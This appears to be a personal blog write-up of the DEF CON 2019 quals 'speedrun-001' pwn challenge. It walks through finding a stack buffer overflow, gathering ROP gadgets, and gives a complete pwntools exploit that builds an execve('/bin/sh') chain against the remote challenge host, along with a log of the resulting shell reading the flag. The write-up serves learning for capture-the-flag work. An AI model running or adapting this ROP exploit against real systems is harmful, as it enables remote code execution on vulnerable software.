---
title: 'defcon 2019 quals speedruns'
description: 'Some basic challenges based on the defcon 2019 quals speedrun pwn challenges'
pubDate: 'Sep 13 2024'
heroImage: 
  src: '/blog-placeholder-1.jpg'
  alt: ''
order: 1
tags: ["off-season"]
---

## Background Information

I suck at pwn, but I want to delve more into low-level languages so I decided to distance myself from web and into languages like C or Rust. I also want to try something that's a little less like reverse engineering since I am really bad at reverse engineering. These speedrun challs were also defined as easy, so I think it will be good practice to learn some fundamentals behind pwn.

### speedrun-001

So we are provided a binary. We can check for the protections the binary has:

```bash
[*] '/home/jake/ctf/defcon-2019/speedrun-001/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Ok. So there is no canary and no pie. So we won't have to worry about those at all. 

Let's check the binary. 

uh oh. this binary is stripped and everything looks like dog. So how about we try things dynamically?

We execute the binary and are prompted with this:

```bash
jake@computer:~/ctf/defcon-2019/speedrun-001$ ./speedrun-001 
Hello brave new challenger
Any last words?

```

We can write basically anything and it will just terminate. So with this, we can imagine a simple buffer overflow(?) All it takes is to find the offset of our input and to the registers in order to manipulate program flow

So we load gdb and get to analyzing. 

We can basically just start brute forcing payloads with random sizes in order to see where the program crashes. Upon like 2000 the program crashes and we can calculate an offset of 1024. This means that we need to place in 1032 bytes of garbage (+8 to reach the register that controls return) and then we can start trying to find a way to exploit this further

Ok. We now can control the return register, but what can we do to achieve our goal of "pwning" the system?

Let's try ROP. ROP or (Return Oriented Programming) is an exploitation technique that leverages pieces of code already present in the binary or in loaded libraries, known as "gadgets". These then become a large chain of small commands that finally lead to overall code execution.

Since we do not know the libc of the server, we can try to build towards an execve syscall ROP. 

Let's find `pop gadgets` because we need those to initalize the registers and prepare arguments to send to the syscall: 

Using `ROPgadget` we are able to locate the essential gadgets needed for the execve syscall ROP:

```python
pop_rax_gadget = 0x0000000000415664
pop_rdi_gadget = 0x0000000000400686
pop_rdx_gadget = 0x00000000004498b5
pop_rsi_gadget = 0x00000000004101f3
```

We also collect write and syscall gadgets

```python
write_gadget = 0x000000000048d251
syscall = 0x000000000040129c
```

The reason we collect the `rax`, `rdi`, `rdx`, and `rsi` gadgets is because `rax` sets the syscall number of execve, `rdi` sets the string '/bin/sh', `rdi` ensures 0 arguments, and `rsi` ensures no environmental variables.

We collect the write gadget because we need to ensure we can send `/bin/sh` and so we write from rdx to rax.

We then do basic assembly to intialize the execve syscall and then execute.

Full exploit code here:

```python
from pwn import *
from pwn import p64

elf = ELF('./speedrun-001')

if args.REMOTE:
    r = remote('35.164.239.133', 31337)
else:
    r = process(elf.path)

amount = 1024
payload = b'A' * (amount + 8)

#prepare ROP chain to go to /bin/sh
#prepare gadgets
pop_rax_gadget = p64(0x0000000000415664)
pop_rdi_gadget = p64(0x0000000000400686)
pop_rdx_gadget = p64(0x00000000004498b5)
pop_rsi_gadget = p64(0x00000000004101f3) 

#prepare the write and syscall gadget (mov qword ptr [rax], rdx ; ret)
write_gadget = p64(0x000000000048d251)
syscall = p64(0x000000000040129c)
#/bin/sh
rop = pop_rdx_gadget
rop += b"/bin/sh\x00"
rop += pop_rax_gadget
rop += p64(0x6b6000)
rop += write_gadget
#prepare four registers with arguments and make syscall
rop += pop_rax_gadget
rop += p64(0x3b)
rop += pop_rdi_gadget
rop += p64(0x6b6000)
rop += pop_rsi_gadget
rop += p64(0x0)
rop += pop_rdx_gadget
rop += p64(0x0)
rop += syscall

payload += rop

r.sendline(payload)
r.interactive()
```

We get the flag!

```bash
[+] Opening connection to 52.37.0.17 on port 31337: Done
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb5\x98D
$ cat /flag
OOO{Ask any pwner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}
[*] Got EOF while reading in interactive
$  
```